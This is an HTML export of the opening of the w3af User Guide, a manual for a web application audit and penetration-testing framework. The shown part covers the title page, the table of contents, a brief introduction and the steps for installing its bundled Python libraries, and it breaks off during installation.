<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /><title /><meta name="generator" content="StarOffice/OpenOffice.org XSLT (http://xml.openoffice.org/sx2ml)" /><meta name="created" content="2007-05-14T16:45:42" /><meta name="changedby" content="dz0" /><meta name="changed" content="2008-01-09T20:10:24" /><base href="." /><style type="text/css">
	@page { size: 8.5inch 11inch; margin-top: 0.7874inch; margin-bottom: 0.7874inch; margin-left: 0.7874inch; margin-right: 0.7874inch }
	table { border-collapse:collapse; border-spacing:0; empty-cells:show }
	td, th { vertical-align:top; }
	h1, h2, h3, h4, h5, h6 { clear:both }
	ol, ul { padding:0; }
	* { margin:0; }
	*.Caption { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.0835in; margin-bottom:0.0835in; font-style:italic; }
	*.Contents2 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.1965in; margin-right:0in; text-indent:0inch; }
	*.Contents3 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.3929in; margin-right:0in; text-indent:0inch; }
	*.ContentsHeading { font-family:'Bitstream Vera Sans'; font-size:16pt; margin-top:0.1665in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:bold; }
	*.Heading { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; }
	*.Heading1 { font-family:'Bitstream Vera Sans'; font-size:24pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.Heading2 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; }
	*.Heading3 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.Index { font-family:'Bitstream Vera Sans'; font-size:12pt; }
	*.List { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P1 { font-family:'Bitstream Vera Sans'; font-size:16pt; margin-top:0.1665in; margin-bottom:0.0835in; text-align:center ! important; font-weight:bold; text-decoration:underline; }
	*.P10 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P100 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P101 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P102 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P103 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P104 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P105 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P106 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P107 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P108 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P109 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P11 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P110 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P111 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P112 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P113 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P114 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P115 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P116 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P117 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P118 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P119 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P12 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:italic; }
	*.P120 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P121 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P122 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P123 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P124 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P125 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P126 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P127 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P128 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P13 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P14 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P15 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P16 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P17 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P18 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:bold; }
	*.P19 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P2 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:normal; font-weight:normal; }
	*.P20 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P21 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P22 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:normal; }
	*.P23 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P24 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P25 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P26 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:bold; }
	*.P27 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P28 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P29 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:normal; font-weight:bold; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P3 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:normal; font-weight:bold; }
	*.P30 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P31 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P32 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P33 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P34 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P35 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0in; margin-bottom:0.0835in; font-weight:bold; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P36 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P37 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-style:normal; }
	*.P38 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; font-weight:normal; }
	*.P39 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P4 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:italic; font-weight:bold; text-decoration:underline; }
	*.P40 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P41 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:bold; }
	*.P42 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:bold; }
	*.P43 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:bold; }
	*.P44 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P45 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:normal; }
	*.P46 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P47 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P48 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P49 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P5 { font-family:'Bitstream Vera Sans'; font-size:12pt; text-align:center ! important; }
	*.P50 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:bold; }
	*.P51 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:-0.9846in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P52 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P53 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.1965in; margin-right:0in; text-indent:0inch; }
	*.P54 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.3929in; margin-right:0in; text-indent:0inch; }
	*.P55 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; text-align:justify ! important; }
	*.P56 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P57 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P58 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P59 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P6 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:italic; font-weight:bold; text-decoration:underline; }
	*.P60 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P61 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P62 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P63 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P64 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P65 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P66 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-style:italic; }
	*.P67 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-style:italic; }
	*.P68 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-style:italic; }
	*.P69 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-style:italic; }
	*.P7 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; }
	*.P70 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P71 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P72 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P73 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P74 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P75 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P76 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P77 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P78 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P79 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P8 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.P80 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P81 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P82 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P83 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P84 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P85 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P86 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P87 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P88 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P89 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P9 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P90 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P91 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P92 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P93 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P94 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P95 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P96 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P97 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P98 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P99 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.PreformattedText { font-family:'Bitstream Vera Sans Mono'; font-size:10pt; margin-top:0in; margin-bottom:0in; }
	*.Standard { font-family:'Bitstream Vera Sans'; font-size:12pt; }
	*.Textbody { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.Sect1 { }
	*.BulletSymbols { font-family:StarSymbol; font-size:9pt; }
	*.Internetlink { color:#000080; text-decoration:underline; }
	*.NumberingSymbols { }
	*.T1 { font-style:italic; }
	*.T2 { font-style:normal; }
	*.T3 { font-weight:bold; }
	*.T4 { font-family:'Nimbus Mono L'; }
	*.T5 { font-family:'Nimbus Mono L'; font-weight:normal; }
	*.T6 { font-family:'Bitstream Vera Sans'; }
	*.T7 { font-family:'Bitstream Vera Sans'; font-weight:normal; }
	*.T8 { font-family:'Bitstream Vera Sans'; font-style:normal; background-color:transparent; }
	*.T9 { font-weight:normal; }
	</style></head><body dir="ltr"><p class="P1"> </p><p class="P1"> </p><p class="P1"> </p><p class="P1"> </p><p class="P1"> </p><p class="P1">w3af User Guide </p><p class="P2"> </p><p class="P2"> </p><p class="P2">Document version: <span class="T3">1.2</span></p><p class="P2">Original author: <span class="T3">Andres Riancho</span></p><p class="P2"> </p><p class="P2"> </p><p class="P2">Reviewed by:  </p><p class="P3">Mike Harbison </p><p class="P3">Andy Bach </p><p class="P3"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4">October 15, 2007 </p><p class="P6"> </p><p class="ContentsHeading">Table of Contents </p><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Introduction </td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Installation</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P54"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Requirements</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>w3af phases</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Running w3af</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P54"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Plugins</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P54"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Plugin configuration</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Starting a scan</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P54"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>A complete session</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>A warning about discovery</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P54"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>When everything else fails...</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>w3af scripts</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>The Output</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Complex sites</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Exploiting</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P54"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Advanced exploiting techniques</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P54"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Virtual daemon</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P54"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>w3afAgent</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>More information</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Bugs</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P53"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Final words</td></tr></table><p class="P5"> </p><h2 class="P7"><a name="Introduction" />Introduction </h2><p class="P10">This document is a user guide for version 1.0 of the Web Application Attack and Audit Framework ( w3af ), its goal is to provide a basic overview of what the Framework is, how it works and what you can do with it.  </p><p class="P36">w3af is a complete environment for auditing and attacking web applications. This environment provides a solid platform for auditing and penetration-testing.  </p><p class="Textbody"> </p><h2 class="Heading2"><a name="Installation" />Installation</h2><p class="P11">The framework should work on all platforms supported by Python. This user guide will guide you through the installation on a Linux platform, but installation on Windows and OSX is possible and straight forward. </p><h3 class="Heading3"><a name="Requirements" />Requirements</h3><p class="P9">The framework has the following requirements: </p><ul style="margin-left:0.5cm;"><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">fpconst-0.7.2 </p></li><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">pygoogle </p></li><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">pywordnet </p></li><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">SOAPpy </p></li><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">pyPdf </p></li><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">Beautiful Soup </p></li></ul><p class="P9"> </p><p class="P10">The first five requirements are bundled with the distribution file “w3af-&lt;version&gt;</p><p class="P10">.bzip2”, inside the “extlib” directory. The installation steps for this libraries are ( as root ): </p><p class="P9"> </p><p class="P39">cd w3af </p><p class="P39">cd fpconst-0.7.2 </p><p class="P39">python setup.py install </p><p class="P39">cd .. </p><p class="P39">cd pygoogle </p><p class="P39">python setup.py install </p><p class="P39">cd .. </p><p class="P39">cd pywordnet </p><p class="P39">python setup.py install </p><p class="P39">cd ..</p><p class="P39">cd SOAPpy </p><p class="P39">python setup.py install </p><p class="P39">cd pyPdf </p><p class="P39">python setup.py install </p><p class="P9"> </p><p class="P10">You can also download all the libraries from the corresponding sites and install them from there, the libraries are bundled with w3af for installation ease. </p><p 